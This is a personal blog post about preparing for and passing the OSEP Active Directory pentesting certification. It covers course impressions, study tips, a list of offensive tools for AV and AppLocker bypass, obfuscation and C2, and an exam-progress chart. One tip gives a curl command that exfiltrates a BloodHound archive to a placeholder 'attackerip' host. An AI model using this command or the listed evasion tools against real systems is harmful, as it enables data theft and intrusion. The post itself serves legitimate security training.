---
layout: post
slug: passing-osep
title: my experience passing the osep cert
tags: [certs, pentesting]
---

I recently passed the OSEP exam on the first attempt, achieving both independent requirements to pass: >=100 points and the slippery `secret.txt` flag. 💅

I wanted to solidify my internal pentesting skillz, since web hacking is more my comfort zone (check my [OSWE cert review](/passing-oswe)). So this was a great opportunity to push myself and learn in a challenging environment.

Here I'll share my personal experience preparing for this exam.

**Spoiler**: there will be no *spoilers* here. It's just my personal experience, without anything that isn't already public.

### os-what?
The [Offensive Security Experienced Pentester (OSEP)](https://www.offsec.com/courses/pen-300/) from OffSec is probably the most advanced active directory penetration testing cert, along with the [Certified Active Directory Pentesting Expert (CAPE)](https://academy.hackthebox.com/preview/certifications/htb-certified-active-directory-pentesting-expert) from HackTheBox[^1].

[PEN-300: Advanced Penetration Testing (PEN-300)](https://www.offsec.com/courses/pen-300/) is the course behind the OSEP certification, and it covers a wide range of internal penetration testing skills and techniques, including:

* develop client-side attack techniques using Microsoft Office and other common applications, including building a reliable attack vector
* master antivirus evasion methods and tools
* bypass application whitelisting mechanisms like AppLocker
* implement advanced lateral movement strategies in Windows and Linux environments
* conduct sophisticated Active Directory exploitation and attacks to uncover hidden vulnerabilities
* evade network detection systems, including IDS and IPS
* perform advanced exploitation of Microsoft SQL and Active Directory
* use advanced programming concepts and Win32 APIs for attack development

### the course
Overall, the course is pretty well put together. The content is easy to follow and goes in-depth on relevant topics. Some sections aren't strictly required for the exam, but it's super helpful to know what's under the hood.

Fun fact: I managed to [escalate a sqli to an rce](/escalating-preauth-sqli-to-rce) in a real engagement thanks to studying this cert. So just for that, I guess it was worth it, kek.

#### stuff I liked
- the network section was accurate and aligned with what I've seen in real enterprise setups.
- the demo of _why_ and _how_ the default meterpreter obfuscation gets flagged is 🔥.
- the challenges' attack paths cover the course material quite organically.
- the adcs section has now been included!
- phishing via ics calendar invites was very interesting and up to date.
- pwning ci/cd pipelines open a ton of possibilities for latmov. Learned a lot here!

#### stuff I didn't \*love\*
- _post-exploitation is sometimes too permissive_: once you're local admin, you can do basically anything, like disabling defender and/or firewall rules.
- _few OPSEC refs/considerations_, e.g. psexec usage, `net user`, etc.
- _some AV bypasses are too naïve_, e.g. vanilla process hollowing would get caught by Crowdstrike or any other competent EDR. That said, EDR evasion is a demanding field that requires constant updates, and this course does provide a solid baseline.
- _phishing is mostly vba macros and hta_. both are a bit outdated (macros are disabled by default now) and easy to detect.

### reqs
IMHO, the following skills matter:
- _ad hacking_: being familiar with the core concepts and common offensive techniques.
- _programming background_: being fluent with c# and powershell.
- _ctf experience_: if you don't have some background pwning boxes, you will struggle.
- _windows internals_: nothing crazy, but knowing winapi, process and filesystem structure, etc. helps.

### prep
I prepped for 1.5 months, and this was my strategy:
1. reviewed external content listed in [references](#references).
2. watched a selection of the course videos at 2x speed. Just the most challenging topics.
3. actively read the book: highlighting important stuff and taking notes on useful commands.
4. pwned the first 5 challenges. Thoroughly. Investigating all possible attack paths, e.g. dropper vs loader.
5. re-reviewed my challenge solutions and forced myself to understand \*all\* the concepts behind the techniques: if you fall down a rabbit hole and treat everything as a black box, you're asking for trouble.

### r4nd0m tips
- you can compile with [mono](https://www.mono-project.com/) to avoid visual studio. I basically managed to compile everything in kali and didn't touch the windows lab machine[^3]!
- change the name of the artifacts because they don't necessarily overwrite![^2]
- [updog](https://github.com/sc0tfree/updog) is god. You can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
- migrate your revshell processes for stability.
- get comfortable with network pivoting.
- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide[^4]. 
- read the exam guide and the exam objectives. For instance, ai chatbots, paid tools and automated exploitation are not allowed.
- IMHO, the challenges prepare you _enough_ to face the exam. Although I've heard HTB RastaLabs and Offshore are good prep too.
- have a plan z: there are too many variables involved, so if something fails, you need to know different alternatives.
- take good notes before and \*during\* the exam. The environment is huge and you can get lost/overwhelmed easily.

### resources
I came across a ton of resources, but here's a curated list of the most practical ones.

OSEP-specific resources sorted by subjective usefulness:
- [https://www.emmanuelsolis.com/osep.html](https://www.emmanuelsolis.com/osep.html)
- [https://github.com/OoStellarnightoO/OSEP_Notes](https://github.com/OoStellarnightoO/OSEP_Notes)
- [https://0x4rt3mis.github.io/posts/OSEP-Cheat-Sheet/](https://0x4rt3mis.github.io/posts/OSEP-Cheat-Sheet/)
- [https://github.com/darkness215/osep-tools/](https://github.com/darkness215/osep-tools/)
- [https://github.com/beauknowstech/OSEP-Everything](https://github.com/beauknowstech/OSEP-Everything)

**Important**: be aware that some of these commands and scripts are now flagged, since the osep environment gets updated over time, so don't be cocky and test everything before trying your luck on the exam.

Related off-topic resources:
- [ippsec writeups](https://ippsec.rocks)
- [goad pwning series by mayfly277](https://mayfly277.github.io/posts/GOADv2/)
- [tcm ad section of the PEH course](https://tcm-sec.com/academy/practical-ethical-hacking/)[^5].
- [orange cyberdefense ad cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

Not strictly required, but the book _"Evading EDR"_ from No Starch Press is 🔥:
![Evading EDR book](/assets/img/evading-edr.jpeg)

### my gig
Here was my arsenal of tools[^6]:
- external recon: [autorecon](https://github.com/AutoRecon/AutoRecon)
- c2: keep calm and use [meterpreter](https://www.offsec.com/metasploit-unleashed/) (with custom c# loaders aligned with the book's content)
- clm: [bypass-clm](https://github.com/calebstewart/bypass-clm)
- obfuscation: [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) and [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-obfuscation)
- vba macros: [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
- file sharing: [updog](https://github.com/sc0tfree/updog). It has file upload functionality too!
- ad enum: [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and [adpeas](https://github.com/61106960/adPEAS)
- hta: [Dotnet2JScript](https://github.com/tyranid/dotnettojscript) loading the js as an external file
- privesc enum: [peas-ng suite](https://github.com/peass-ng/PEASS-ng/tree/master) and [powerup](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). But honestly, I ended up doing everything manually.
- revshell: [penelope](https://github.com/brightio/penelope)
- compiler: [mono](https://www.mono-project.com/), downloading missing dll dependencies from [nuget.org](https://nuget.org)

And my kali setup:
- virtualization: [kali on qemu on debian](/kali-on-qemu-on-debian)
- reporting: [sysreptor](https://docs.sysreptor.com/offsec-reporting-with-sysreptor/).
- note taking: [obsidian](https://obsidian.md/)
- terminal: [terminator](https://gnome-terminator.org/)
- rdp client: [remmina](https://remmina.org/)
- browser extension: [Bye Bye, Google AI: Turn off Google AI Overviews, Discussions and Ads](https://chromewebstore.google.com/detail/bye-bye-google-ai-turn-of/imllolhfajlbkpheaapjocclpppchggc?pli=1)

### exam

As you may already know, OffSec advanced exams give you 48h for the technical part and 24h to write the report. I knew it was going to be *intense*.

I grabbed a monster[^7] and started it at 0100 AM. I promised myself I wouldn't go to sleep until I got comfortable with the progress.

After 5 hours I had 30 points. I was feeling confident about the next steps, so I took a nap.

I woke up at 0930 AM. Then I made a lot of progress. Not everything is linear, and effort doesn't always translate into flags. People always stress that if you're stuck, don't force it: take a walk. But I think the opposite is also true: if you're on a roll, **don't stop digging**. 🪏

Then I hit a wall after the 6th flag, so I took a walk to lower my cortisol levels. My plan: keep tryharding until day two, and if I still had no luck by then, switch to the second path and grab more flags there.

It was quite frustrating since I had a clear idea of what I wanted to do, but somehow it didn't work. Finally, I caught it: I had missed a little syntax detail. 🤦‍♂️

So after ~23h I went to sleep with 9 flags in my pocket: I just needed one more. On day two, I woke up at 0800 AM. Then I pulled `secret.txt` at 1000 AM, which meant I met both independent criteria to pass: >=100 points and the `secret.txt`. 

Finally, I crafted the report with sysreptor and sent it for review that same evening.

#### timeline

I asked Claude to create this fun timeline of my exam progress:

<style>
  .wrap { max-width: 1400px; margin: 0 auto; }
  .chart-box { position: relative; height: 640px; }
  .timeline-fallback { display: none; }
  @media (max-width: 768px) {
    .wrap { display: none; }
    .timeline-fallback { display: block; }
  }
</style>

<div class="wrap">
  <div class="chart-box">
    <canvas id="osepChart"></canvas>
  </div>
</div>

<img class="timeline-fallback" src="/assets/img/osep-timeline.png" alt="OSEP exam timeline" />

<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-annotation@3.0.1/dist/chartjs-plugin-annotation.min.js"></script>
<script type="text/javascript">
  // Use Agave everywhere in the chart — ticks, titles, tooltips, annotations all inherit this
  Chart.defaults.font.family = "'Agave', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace";
 
  // X axis is "hours since 01:00 day 1" (01:00 = 0).
  // Helper: build hour-offset from HH:MM and day index (1 or 2).
  const t = (hh, mm, day = 1) => (day - 1) * 24 + hh + mm / 60 - 1;
 
  // Cumulative score events
  const events = [
    { x: t(1, 35),     y: 10  },
    { x: t(2, 4),      y: 20  },
    { x: t(4, 13),     y: 30  },
    { x: t(12, 33),    y: 40  },
    { x: t(13, 43),    y: 50  },
    { x: t(21, 35),    y: 60  },
    { x: t(22, 30),    y: 70  },
    { x: t(22, 38),    y: 80  },
    { x: t(0, 15, 2),  y: 90  },
    { x: t(10, 0, 2),  y: 100 }
  ];
 
  // Build the line data: start at (0,0) so the line begins at 01:00 / 0pts
  const lineData = [{ x: 0, y: 0 }, ...events.map(e => ({ x: e.x, y: e.y }))];
 
  // Format an "hours past 01:00 day 1" value back into HH:MM (no day marker)
  function fmtTime(hoursPastStart) {
    const totalMins = Math.round((hoursPastStart + 1) * 60);
    const mod  = ((totalMins % (24 * 60)) + (24 * 60)) % (24 * 60);
    const h    = Math.floor(mod / 60);
    const m    = mod % 60;
    const pad  = (n) => String(n).padStart(2, '0');
    return `${pad(h)}:${pad(m)}`;
  }
 
  const ctx = document.getElementById('osepChart').getContext('2d');
 
  new Chart(ctx, {
    type: 'line',
    data: {
      datasets: [{
        label: 'Cumulative points',
        data: lineData,
        tension: 0.15,
        borderColor: '#2da44e',
        backgroundColor: 'rgba(45, 164, 78, 0.18)',
        fill: true,
        borderWidth: 2.5,
        pointRadius: 5,
        pointHoverRadius: 7,
        pointBackgroundColor: '#2da44e',
        pointBorderColor: '#ffffff',
        pointBorderWidth: 2
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      // Top padding for the lock + secret.txt above the last point
      layout: {
        padding: { top: 20, right: 20, bottom: 10, left: 10 }
      },
      interaction: { mode: 'nearest', intersect: false },
      plugins: {
        legend: { display: false },
        title: {
          display: false,
          text: 'my osep exam timeline',
          font: { size: 20, weight: 'bold' },
          color: '#1f2937',
          padding: { top: 4, bottom: 16 }
        },
        tooltip: {
          callbacks: {
            title: (items) => fmtTime(items[0].parsed.x),
            label: (item)  => `${item.parsed.y} pts`
          }
        },
        annotation: {
          annotations: {
            // ---- Pass line at 100 points (line + plain text, no label box) ----
            passLine: {
              type: 'line',
              yMin: 100, yMax: 100,
              borderColor: '#1f2937',
              borderWidth: 2,
              borderDash: [8, 6]
            },
            passText: {
              type: 'label',
              xValue: 0.5,           // near the left edge
              yValue: 100,
              content: 'Passing threshold',
              color: '#1f2937',
              font: { weight: 'bold', size: 13 },
              position: { x: 'start', y: 'center' },
              xAdjust: 70,
              yAdjust: -12,
              backgroundColor: 'rgba(0,0,0,0)'
            },
 
            // ---- Sleep #1: 05:00 – 09:30 ----
            sleep1: {
              type: 'box',
              xMin: t(6, 0), xMax: t(9, 30),
              yMin: 0, yMax: 120,
              backgroundColor: 'rgba(99, 145, 255, 0.18)',
              borderColor: 'rgba(99, 145, 255, 0.45)',
              borderWidth: 1,
              label: {
                display: true,
                content: '😴 sleep',
                position: { x: 'center', y: 'start' },
                color: '#1a3a8f',
                font: { weight: 'bold', size: 13 },
                backgroundColor: 'rgba(255,255,255,0.6)'
              }
            },
 
            // ---- Crying harder: 14:00 – 21:00 ----
            crying: {
              type: 'box',
              xMin: t(14, 0), xMax: t(21, 0),
              yMin: 0, yMax: 120,
              backgroundColor: 'rgba(255, 99, 99, 0.18)',
              borderColor: 'rgba(255, 99, 99, 0.45)',
              borderWidth: 1,
              label: {
                display: true,
                content: '😭 crying harder',
                position: { x: 'center', y: 'start' },
                color: '#8a1f1f',
                font: { weight: 'bold', size: 13 },
                backgroundColor: 'rgba(255,255,255,0.6)'
              }
            },
 
            // ---- Sleep #2: day 2  00:30 – 08:00 ----
            sleep2: {
              type: 'box',
              xMin: t(0, 30, 2), xMax: t(8, 0, 2),
              yMin: 0, yMax: 120,
              backgroundColor: 'rgba(99, 145, 255, 0.18)',
              borderColor: 'rgba(99, 145, 255, 0.45)',
              borderWidth: 1,
              label: {
                display: true,
                content: '😴 sleep',
                position: { x: 'center', y: 'start' },
                color: '#1a3a8f',
                font: { weight: 'bold', size: 13 },
                backgroundColor: 'rgba(255,255,255,0.6)'
              }
            },
 
            // ---- Unlocked lock above the final 10:00 (day 2) point ----
            unlockEmoji: {
              type: 'label',
              xValue: t(10, 0, 2),
              yValue: 100,
              content: '🔓',
              font: { size: 22 },
              xAdjust: 0,
              yAdjust: -46,
              backgroundColor: 'rgba(0,0,0,0)'
            },
            // ---- "secret.txt" filename label on the last point ----
            secretFile: {
              type: 'label',
              xValue: t(10, 0, 2),
              yValue: 100,
              content: 'secret.txt',
              color: '#1f2937',
              font: {
                family: 'Agave, ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
                size: 13,
                weight: 'bold'
              },
              xAdjust: 0,
              yAdjust: -22,
              padding: 4,
            }
          }
        }
      },
      scales: {
        x: {
          type: 'linear',
          min: 0,
          max: 35,                       // 01:00 day 1  →  12:00 day 2 = 35 hours
          title: { display: true, text: 'Time' },
          ticks: {
            stepSize: 1,                 // 1-hour ticks
            maxRotation: 60,
            minRotation: 60,
            autoSkip: false,
            font: { size: 11 },
            callback: (v) => fmtTime(v)
          },
          grid: { color: 'rgba(0,0,0,0.06)' }
        },
        y: {
          min: 0,
          max: 120,
          title: { display: true, text: 'Points' },
          ticks: { stepSize: 10 },
          grid: { color: 'rgba(0,0,0,0.08)' }
        }
      }
    }
  });
</script>

### wh00t wh00t

Two days after the exam I received the beloved email from OffSec. I passed! Yay!

![OSEP cert exam](/assets/img/osep-cert.jpeg)

Was it worth the sweat? Absolutely. Most of the content actually transfers to real engagements, which is what I really cared about.

Already deep into [OSED](https://www.offsec.com/courses/exp-301/) prep. Will share that story here too whenever I make it through. Wish me luck! 🤞

[^1]: well, generalizing here: there are others like CRTO, CRTE, CRTL, etc. There's no 1-to-1 comparison since each one focuses on a different angle: av/edr evasion, c2, etc.
[^2]: wasted hours because of this, kek.
[^3]: somehow slow AF.
[^4]: I used msf because I was more familiar with it and it aligns with the course content. That said, other options like Sliver also have [success stories worth checking out](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver).
[^5]: I had already purchased it when doing the PNPT cert a while ago.
[^6]: note that I've omitted the most obvious ones like `mimikatz` or `secretsdump`. Duh.
[^7]: not sponsored.